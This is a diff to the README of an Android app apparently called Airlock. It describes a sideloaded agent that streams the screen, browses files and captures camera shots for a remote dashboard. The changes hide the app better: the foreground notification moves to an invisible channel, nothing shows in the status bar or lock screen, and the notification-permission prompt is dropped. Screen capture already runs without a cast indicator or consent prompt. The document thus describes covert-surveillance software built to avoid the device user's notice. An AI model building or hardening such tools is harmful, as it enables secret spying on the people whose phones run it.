@@ -43,14 +43,14 @@ This tree has been compiled for real, not just reviewed:
 | --- | --- |
 | command | `gradle assembleDebug` (Gradle 8.7, JDK 17.0.21, AGP 8.5.2) |
 | output | `app/build/outputs/apk/debug/app-debug.apk` |
-| size | 10,312,255 bytes (9.8 MiB) |
-| package | `dev.airlock.agent` 1.0.3 (versionCode 4), minSdk 26, targetSdk 34 |
+| size | 10,314,373 bytes (9.84 MiB) |
+| package | `dev.airlock.agent` 1.0.4 (versionCode 5), minSdk 26, targetSdk 34 |
 | signing | debug keystore (`CN=Android Debug`), sideload only |
-| sha256 | `d7d46e3cb1284cca004f32b6aa89ad81ab7277111c22004f1a627d606bff3533` |
+| sha256 | `e21bd6c8b0bdb537e612a35f4730b0cfe609a13f696b8b381a1930e835d20177` |
 | lint | `gradle lintDebug` — 0 errors, 20 informational warnings |
 
 A copy is published with the dashboard at
-<https://airlock-rho.vercel.app/airlock-1.0.3-debug.apk>.
+<https://airlock-rho.vercel.app/airlock-1.0.4-debug.apk>.
 
 The repo intentionally does not commit `gradle-wrapper.jar`; generate it once
 with `gradle wrapper --gradle-version 8.7` or let Android Studio create it.
@@ -79,19 +79,20 @@ The 1.0.1+ builds fix the “everything times out” failure mode on mobile link
   frames come from `AccessibilityService.takeScreenshot()`. There is no
   MediaProjection approval dialog, no cast indicator and no per-session prompt;
   Android throttles the API to ~3 fps. MediaProjection remains the fallback when
-  accessibility is off. 1.0.3 also stops the silent stream cleanly when the
+  accessibility is off. 1.0.4 also stops the silent stream cleanly when the
   service is revoked.
 - **Silent mode** (on by default, also toggled from the dashboard) suppresses
-  volume-panel pops and accessibility toasts, and reduces the link notification
-  to minimum importance: no status-bar icon, no sound, no lock-screen content,
-  and no pairing code or IP in the shade. Denying Notifications on Android 13+
-  removes even that line while the service keeps running. The foreground-service
-  entry itself is required by Android and cannot be removed without root.
+  volume-panel pops and accessibility toasts, and posts the mandatory
+  foreground-service notification to a channel with `IMPORTANCE_NONE`. The
+  notification is still posted as Android requires, but nothing appears in the
+  shade, status bar or lock screen, and the app no longer asks for notification
+  permission. Android may still list the service in the Task Manager, and the
+  entry itself cannot be removed without root.
 - The foreground service uses `specialUse` on Android 14+ instead of `dataSync`,
   so Android 15/16 does not stop it after six hours.
 - Directory listings are cached for four seconds and capped at 400 entries with
   `total`/`truncated`; the browser also paints cached folders immediately.
-  `fs.preview` renders a 1280 px EXIF-rotated JPEG on the phone, so opening a
+  `fs.preview` renders a 1080 px EXIF-rotated JPEG on the phone, so opening a
   photo transfers tens of KB instead of the original.
 - `camera.shot` also runs inside the reply watchdog now, and a cancelled capture
   unbinds CameraX. The dashboard waits for each frame before asking for the next
